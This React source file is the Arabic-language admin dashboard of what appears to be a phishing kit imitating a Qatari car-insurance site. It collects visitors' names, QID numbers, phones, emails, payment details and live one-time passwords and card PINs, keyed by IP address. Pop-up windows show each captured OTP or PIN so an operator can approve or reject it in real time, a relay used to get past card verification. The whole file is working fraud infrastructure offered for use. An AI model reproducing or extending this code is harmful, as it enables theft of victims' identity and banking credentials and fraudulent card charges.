import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { 
  LogOut, Search, Eye, Trash2, RefreshCw, Users, CreditCard, 
  Shield, Clock, CheckCircle, XCircle, AlertCircle, Activity,
  TrendingUp, DollarSign, Phone, Mail, MapPin, Calendar
} from 'lucide-react';
import { useSocket } from '../context/SocketContext';

export default function AdminDashboard() {
  const navigate = useNavigate();
  const { socket, connected } = useSocket();
  
  const [customers, setCustomers] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState('all'); // all, active, offline, pending, approved
  const [selectedCustomer, setSelectedCustomer] = useState(null);
  const [showDetailsModal, setShowDetailsModal] = useState(false);
  const [stats, setStats] = useState({
    total: 0,
    active: 0,
    pending: 0,
    approved: 0,
    rejected: 0,
    totalRevenue: 0
  });

  // Pending OTP/PIN
  const [pendingOTP, setPendingOTP] = useState(null);
  const [pendingPIN, setPendingPIN] = useState(null);

  useEffect(() => {
    const isAuth = sessionStorage.getItem('adminAuthenticated');
    if (!isAuth) {
      navigate('/admin/login');
      return;
    }
  }, [navigate]);

  useEffect(() => {
    if (!socket) return;

    // Load initial data
    socket.emit('loadData');

    // Auto-refresh every 10 seconds
    const refreshInterval = setInterval(() => {
      if (socket && connected) {
        socket.emit('loadData');
      }
    }, 10000);

    // Listen for data
    socket.on('initialData', (data) => {
      processCustomersData(data);
    });

    // Real-time updates
    socket.on('newEntryAll', (entry) => {
      console.log('🆕 New entry:', entry);
      socket.emit('loadData'); // Refresh data
    });

    // OTP/PIN listeners
    socket.on('newOTP', (data) => {
      console.log('🔐 New OTP:', data);
      setPendingOTP(data);
    });

    socket.on('newPIN', (data) => {
      console.log('🔑 New PIN:', data);
      setPendingPIN(data);
    });

    socket.on('userConnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: true } : c
      ));
    });

    socket.on('userDisconnected', ({ ip }) => {
      setCustomers(prev => prev.map(c => 
        c.ip === ip ? { ...c, isActive: false } : c
      ));
    });

    return () => {
      clearInterval(refreshInterval);
      socket.off('initialData');
      socket.off('newEntryAll');
      socket.off('newOTP');
      socket.off('newPIN');
      socket.off('userConnected');
      socket.off('userDisconnected');
    };
  }, [socket, connected]);

  const processCustomersData = (data) => {
    const customersMap = new Map();
    const allIPs = new Set();

    // Collect all IPs
    [
      data.carDetails, data.moreDetails, data.selectInsurance,
      data.insuranceInfo, data.payment, data.locations,
      data.otpCodes, data.pinCodes
    ].forEach(arr => {
      if (Array.isArray(arr)) {
        arr.forEach(item => item.ip && allIPs.add(item.ip));
      }
    });

    // Build customer objects
    allIPs.forEach(ip => {
      const carDetails = data.carDetails?.find(d => d.ip === ip);
      const moreDetails = data.moreDetails?.find(d => d.ip === ip);
      const insurance = data.selectInsurance?.find(d => d.ip === ip);
      const customerInfo = data.insuranceInfo?.find(d => d.ip === ip);
      const payments = data.payment?.filter(d => d.ip === ip) || [];
      const otpCodes = data.otpCodes?.filter(d => d.ip === ip) || [];
      const pinCodes = data.pinCodes?.filter(d => d.ip === ip) || [];
      const location = data.locations?.find(d => d.ip === ip);
      const isActive = data.activeUsers?.includes(ip) || false;

      // Calculate status
      let status = 'pending';
      if (payments.length > 0) {
        const lastPayment = payments[payments.length - 1];
        status = lastPayment.status || 'pending';
      }

      customersMap.set(ip, {
        ip,
        currentPage: location?.currentPage || '/',
        carDetails,
        moreDetails,
        insurance,
        customerInfo,
        payments,
        otpCodes,
        pinCodes,
        status,
        lastUpdate: new Date().toISOString(),
        isActive
      });
    });

    const customersList = Array.from(customersMap.values()).sort((a, b) => 
      new Date(b.lastUpdate) - new Date(a.lastUpdate)
    );

    setCustomers(customersList);
    updateStats(customersList);
  };

  const updateStats = (customersList) => {
    const stats = {
      total: customersList.length,
      active: customersList.filter(c => c.isActive).length,
      pending: customersList.filter(c => c.status === 'pending').length,
      approved: customersList.filter(c => c.status === 'approved').length,
      rejected: customersList.filter(c => c.status === 'rejected').length,
      totalRevenue: customersList
        .filter(c => c.status === 'approved')
        .reduce((sum, c) => sum + (parseFloat(c.payments[0]?.amount) || 0), 0)
    };
    setStats(stats);
  };

  const handleLogout = () => {
    sessionStorage.clear();
    navigate('/admin/login');
  };

  const handleRefresh = () => {
    if (socket) {
      socket.emit('loadData');
    }
  };

  const approveOTP = () => {
    if (socket && pendingOTP) {
      socket.emit('otpVerificationStatus', {
        status: 'approved',
        message: 'تم قبول رمز التحقق'
      });
      setPendingOTP(null);
    }
  };

  const rejectOTP = () => {
    if (socket && pendingOTP) {
      socket.emit('otpVerificationStatus', {
        status: 'rejected',
        message: 'رمز التحقق غير صحيح'
      });
      setPendingOTP(null);
    }
  };

  const approvePIN = () => {
    if (socket && pendingPIN) {
      socket.emit('pinVerificationStatus', {
        status: 'approved',
        message: 'تم قبول الرمز السري'
      });
      setPendingPIN(null);
    }
  };

  const rejectPIN = () => {
    if (socket && pendingPIN) {
      socket.emit('pinVerificationStatus', {
        status: 'rejected',
        message: 'الرمز السري غير صحيح'
      });
      setPendingPIN(null);
    }
  };

  const viewDetails = (customer) => {
    setSelectedCustomer(customer);
    setShowDetailsModal(true);
  };

  // Filter customers
  const filteredCustomers = customers.filter(customer => {
    const matchesSearch = 
      customer.ip?.includes(searchTerm) ||
      customer.customerInfo?.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      customer.customerInfo?.qid?.includes(searchTerm) ||
      customer.customerInfo?.phone?.includes(searchTerm) ||
      customer.customerInfo?.email?.toLowerCase().includes(searchTerm.toLowerCase());

    const matchesFilter = 
      filterStatus === 'all' ||
      (filterStatus === 'active' && customer.isActive) ||
      (filterStatus === 'offline' && !customer.isActive) ||
      (filterStatus === customer.status);

    return matchesSearch && matchesFilter;
  });

  const getStatusBadge = (status) => {
    const styles = {
      pending: 'bg-yellow-100 text-yellow-800 border-yellow-200',
      approved: 'bg-green-100 text-green-800 border-green-200',
      rejected: 'bg-red-100 text-red-800 border-red-200',
      waiting: 'bg-blue-100 text-blue-800 border-blue-200'
    };

    const icons = {
      pending: <Clock className="w-3 h-3" />,
      approved: <CheckCircle className="w-3 h-3" />,
      rejected: <XCircle className="w-3 h-3" />,
      waiting: <AlertCircle className="w-3 h-3" />
    };

    return (
      <span className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold border ${styles[status] || styles.pending}`}>
        {icons[status]}
        {status.toUpperCase()}
      </span>
    );
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* OTP Modal */}
      {pendingOTP && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-bounce-in">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Shield className="w-10 h-10 text-purple-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">🔐 رمز التحقق OTP</h2>
              <p className="text-gray-600">يرجى مراجعة الرمز والموافقة أو الرفض</p>
            </div>

            <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6 mb-6">
              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">الرمز المُدخل</p>
                <div className="text-4xl font-mono font-bold text-purple-600 tracking-widest">
                  {pendingOTP.otpCode || pendingOTP.payload?.otpCode}
                </div>
              </div>
              
              <div className="border-t border-purple-200 pt-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">البطاقة:</span>
                  <span className="font-mono font-semibold">**** {pendingOTP.cardLastDigits || pendingOTP.payload?.cardLastDigits}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-mono font-semibold">{pendingOTP.phoneNumber || pendingOTP.payload?.phoneNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">المبلغ:</span>
                  <span className="font-bold text-purple-600">{pendingOTP.amount || pendingOTP.payload?.amount} ريال</span>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={approveOTP}
                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <CheckCircle className="w-5 h-5" />
                قبول
              </button>
              <button
                onClick={rejectOTP}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <XCircle className="w-5 h-5" />
                رفض
              </button>
            </div>
          </div>
        </div>
      )}

      {/* PIN Modal */}
      {pendingPIN && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 animate-bounce-in">
            <div className="text-center mb-6">
              <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <CreditCard className="w-10 h-10 text-blue-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">🔑 الرمز السري PIN</h2>
              <p className="text-gray-600">يرجى مراجعة الرمز والموافقة أو الرفض</p>
            </div>

            <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6 mb-6">
              <div className="text-center mb-4">
                <p className="text-sm text-gray-600 mb-2">الرمز المُدخل</p>
                <div className="text-4xl font-mono font-bold text-blue-600 tracking-widest">
                  {pendingPIN.pinCode || pendingPIN.payload?.pinCode}
                </div>
              </div>
              
              <div className="border-t border-blue-200 pt-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">البطاقة:</span>
                  <span className="font-mono font-semibold">**** {pendingPIN.cardLastDigits || pendingPIN.payload?.cardLastDigits}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">الهاتف:</span>
                  <span className="font-mono font-semibold">{pendingPIN.phoneNumber || pendingPIN.payload?.phoneNumber}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">المبلغ:</span>
                  <span className="font-bold text-blue-600">{pendingPIN.amount || pendingPIN.payload?.amount} ريال</span>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={approvePIN}
                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <CheckCircle className="w-5 h-5" />
                قبول
              </button>
              <button
                onClick={rejectPIN}
                className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg transition-colors flex items-center justify-center gap-2"
              >
                <XCircle className="w-5 h-5" />
                رفض
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Details Modal */}
      {showDetailsModal && selectedCustomer && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-40 p-4 overflow-y-auto">
          <div className="bg-white rounded-2xl shadow-2xl max-w-4xl w-full my-8">
            <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white p-6 rounded-t-2xl">
              <div className="flex items-center justify-between">
                <h2 className="text-2xl font-bold">تفاصيل العميل</h2>
                <button
                  onClick={() => setShowDetailsModal(false)}
                  className="text-white hover:bg-white/20 rounded-lg p-2 transition-colors"
                >
                  <XCircle className="w-6 h-6" />
                </button>
              </div>
            </div>

            <div className="p-6 space-y-6 max-h-[70vh] overflow-y-auto">
              {/* Customer Info */}
              <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6">
                <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
                  <Users className="w-5 h-5 text-blue-600" />
                  معلومات العميل
                </h3>
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div>
                    <p className="text-gray-600">الاسم</p>
                    <p className="font-semibold">{selectedCustomer.customerInfo?.name || '—'}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">QID</p>
                    <p className="font-mono font-semibold">{selectedCustomer.customerInfo?.qid || '—'}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">الهاتف</p>
                    <p className="font-mono font-semibold">{selectedCustomer.customerInfo?.phone || '—'}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">البريد الإلكتروني</p>
                    <p className="font-semibold text-xs">{selectedCustomer.customerInfo?.email || '—'}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">IP Address</p>
                    <p className="font-mono font-semibold">{selectedCustomer.ip}</p>
                  </div>
                  <div>
                    <p className="text-gray-600">الحالة</p>
                    <p>{getStatusBadge(selectedCustomer.status)}</p>
                  </div>
                </div>
              </div>

              {/* Car Details */}
              {selectedCustomer.carDetails && (
                <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-xl p-6">
                  <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
                    <Activity className="w-5 h-5 text-green-600" />
                    تفاصيل السيارة
                  </h3>
                  <div className="grid grid-cols-2 gap-4 text-sm">
                    <div>
                      <p className="text-gray-600">الصانع</p>
                      <p className="font-semibold">{selectedCustomer.carDetails.make || '—'}</p>
                    </div>
                    <div>
                      <p className="text-gray-600">الموديل</p>
                      <p className="font-semibold">{selectedCustomer.carDetails.model || '—'}</p>
                    </div>
                    <div>
                      <p className="text-gray-600">السنة</p>
                      <p className="font-semibold">{selectedCustomer.carDetails.year || '—'}</p>
                    </div>
                    <div>
                      <p className="text-gray-600">اللون</p>
                      <p className="font-semibold">{selectedCustomer.carDetails.color || '—'}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Payments */}
              {selectedCustomer.payments && selectedCustomer.payments.length > 0 && (
                <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6">
                  <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
                    <CreditCard className="w-5 h-5 text-purple-600" />
                    معلومات الدفع
                  </h3>
                  {selectedCustomer.payments.map((payment, idx) => (
                    <div key={idx} className="bg-white rounded-lg p-4 mb-3">
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <p className="text-gray-600">طريقة الدفع</p>
                          <p className="font-semibold">{payment.paymentMethod || '—'}</p>
                        </div>
                        <div>
                          <p className="text-gray-600">المبلغ</p>
                          <p className="font-bold text-purple-600">{payment.amount} ريال</p>
                        </div>
                        <div>
                          <p className="text-gray-600">البطاقة</p>
                          <p className="font-mono">**** {payment.cardLastDigits || '****'}</p>
                        </div>
                        <div>
                          <p className="text-gray-600">الوقت</p>
                          <p className="text-xs">{new Date(payment.timestamp).toLocaleString('ar-QA')}</p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              {/* OTP Codes */}
              {selectedCustomer.otpCodes && selectedCustomer.otpCodes.length > 0 && (
                <div className="bg-gradient-to-br from-yellow-50 to-yellow-100 rounded-xl p-6">
                  <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
                    <Shield className="w-5 h-5 text-yellow-600" />
                    رموز OTP
                  </h3>
                  <div className="space-y-2 text-sm">
                    {selectedCustomer.otpCodes.map((otp, idx) => (
                      <div key={idx} className="bg-white rounded-lg p-3 flex justify-between items-center">
                        <span className="font-mono font-bold text-lg">{otp.otpCode}</span>
                        <span className="text-xs text-gray-600">{new Date(otp.timestamp).toLocaleString('ar-QA')}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className="max-w-7xl mx-auto p-6">
        {/* Header */}
        <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white rounded-2xl p-8 mb-6 shadow-lg">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن</h1>
              <div className="flex items-center gap-3">
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                  <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></div>
                  <span className="font-semibold">{connected ? 'متصل' : 'غير متصل'}</span>
                </div>
                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                  <Users className="w-4 h-4" />
                  <span className="font-semibold">{stats.active} / {stats.total} نشط</span>
                </div>
              </div>
            </div>
            <div className="flex gap-3">
              <button
                onClick={handleRefresh}
                className="bg-white/20 hover:bg-white/30 p-3 rounded-lg transition-colors"
                title="تحديث"
              >
                <RefreshCw className="w-6 h-6" />
              </button>
              <button
                onClick={handleLogout}
                className="bg-white/20 hover:bg-white/30 px-6 py-3 rounded-lg flex items-center gap-2 transition-colors"
              >
                <LogOut className="w-5 h-5" />
                تسجيل خروج
              </button>
            </div>
          </div>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-6">
          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-blue-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">إجمالي العملاء</p>
                <p className="text-3xl font-bold text-blue-600">{stats.total}</p>
              </div>
              <div className="bg-blue-100 p-3 rounded-lg">
                <Users className="w-8 h-8 text-blue-600" />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-green-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">العملاء النشطون</p>
                <p className="text-3xl font-bold text-green-600">{stats.active}</p>
              </div>
              <div className="bg-green-100 p-3 rounded-lg">
                <Activity className="w-8 h-8 text-green-600" />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-yellow-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">قيد الانتظار</p>
                <p className="text-3xl font-bold text-yellow-600">{stats.pending}</p>
              </div>
              <div className="bg-yellow-100 p-3 rounded-lg">
                <Clock className="w-8 h-8 text-yellow-600" />
              </div>
            </div>
          </div>

          <div className="bg-white rounded-xl p-6 shadow-md border-l-4 border-purple-500">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-gray-600 text-sm mb-1">إجمالي الإيرادات</p>
                <p className="text-3xl font-bold text-purple-600">{stats.totalRevenue.toFixed(0)} ر.ق</p>
              </div>
              <div className="bg-purple-100 p-3 rounded-lg">
                <DollarSign className="w-8 h-8 text-purple-600" />
              </div>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white rounded-xl p-6 shadow-md mb-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="relative">
              <Search className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input
                type="text"
                placeholder="ابحث بـ IP، الاسم، QID، الهاتف..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pr-12 pl-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-qiic-maroon focus:border-transparent"
                dir="rtl"
              />
            </div>

            <div className="flex gap-2">
              <button
                onClick={() => setFilterStatus('all')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'all' 
                    ? 'bg-qiic-maroon text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                الكل ({stats.total})
              </button>
              <button
                onClick={() => setFilterStatus('active')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'active' 
                    ? 'bg-green-600 text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                نشط ({stats.active})
              </button>
              <button
                onClick={() => setFilterStatus('pending')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'pending' 
                    ? 'bg-yellow-600 text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                معلق ({stats.pending})
              </button>
              <button
                onClick={() => setFilterStatus('approved')}
                className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
                  filterStatus === 'approved' 
                    ? 'bg-green-600 text-white' 
                    : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                }`}
              >
                موافق ({stats.approved})
              </button>
            </div>
          </div>
        </div>

        {/* Customers Table */}
        <div className="bg-white rounded-xl shadow-md overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full" dir="rtl">
              <thead className="bg-gradient-to-r from-gray-800 to-gray-900 text-white">
                <tr>
                  <th className="px-6 py-4 text-right text-sm font-bold">الحالة</th>
                  <th className="px-6 py-4 text-right text-sm font-bold">IP</th>
                  <th className="px-6 py-4 text-right text-sm font-bold">معلومات العميل</th>
                  <th className="px-6 py-4 text-right text-sm font-bold">الصفحة الحالية</th>
                  <th className="px-6 py-4 text-right text-sm font-bold">الدفع</th>
                  <th className="px-6 py-4 text-right text-sm font-bold">الحالة</th>
                  <th className="px-6 py-4 text-center text-sm font-bold">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {filteredCustomers.map((customer, idx) => (
                  <tr key={customer.ip} className={`hover:bg-gray-50 transition-colors ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}>
                    <td className="px-6 py-4">
                      <div className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse' : 'bg-gray-300'}`}></div>
                    </td>
                    <td className="px-6 py-4">
                      <span className="font-mono text-sm font-semibold">{customer.ip}</span>
                    </td>
                    <td className="px-6 py-4">
                      {customer.customerInfo ? (
                        <div>
                          <p className="font-semibold text-gray-900">{customer.customerInfo.name}</p>
                          <p className="text-xs text-gray-600 font-mono">{customer.customerInfo.qid}</p>
                          <p className="text-xs text-gray-600">{customer.customerInfo.phone}</p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-6 py-4">
                      <span className="text-sm text-gray-700">{customer.currentPage}</span>
                    </td>
                    <td className="px-6 py-4">
                      {customer.payments && customer.payments.length > 0 ? (
                        <div>
                          <p className="font-semibold text-purple-600">{customer.payments[0].amount} ر.ق</p>
                          <p className="text-xs text-gray-600">{customer.payments[0].paymentMethod}</p>
                        </div>
                      ) : (
                        <span className="text-gray-400">—</span>
                      )}
                    </td>
                    <td className="px-6 py-4">
                      {getStatusBadge(customer.status)}
                    </td>
                    <td className="px-6 py-4">
                      <button
                        onClick={() => viewDetails(customer)}
                        className="bg-blue-600 hover:bg-blue-700 text-white p-2 rounded-lg transition-colors"
                        title="عرض التفاصيل"
                      >
                        <Eye className="w-5 h-5" />
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {filteredCustomers.length === 0 && (
            <div className="text-center py-12">
              <AlertCircle className="w-16 h-16 text-gray-300 mx-auto mb-4" />
              <p className="text-gray-500 text-lg">لا توجد نتائج</p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-6 text-center text-gray-600 text-sm">
          <p>آخر تحديث: {new Date().toLocaleString('ar-QA')}</p>
          <p className="mt-1">عدد العملاء المعروضين: {filteredCustomers.length} من أصل {customers.length}</p>
        </div>
      </div>
    </div>
  );
}
